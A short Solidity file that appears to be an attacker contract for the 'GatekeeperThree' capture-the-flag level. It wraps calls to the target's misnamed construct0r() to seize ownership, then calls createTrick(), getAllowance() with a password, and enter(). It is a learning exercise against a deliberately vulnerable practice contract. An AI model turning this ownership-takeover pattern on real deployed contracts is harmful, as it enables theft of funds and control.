pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function createTrick() external;
    function getAllowance(uint256 _password) external;
    function enter() external;
}

contract DummyAttacker {
    IGatekeeperThree public target;

    constructor(address _target) {
        target = IGatekeeperThree(_target);
    }

    function takeoverOwnership() public {
        target.construct0r();
    }

    function deployAndSetTrick() public {
        target.createTrick();
    }

    function checkAllowance(uint256 password) public {
        target.getAllowance(password);
    }

    function callEnter() public {
        target.enter();
    }
}
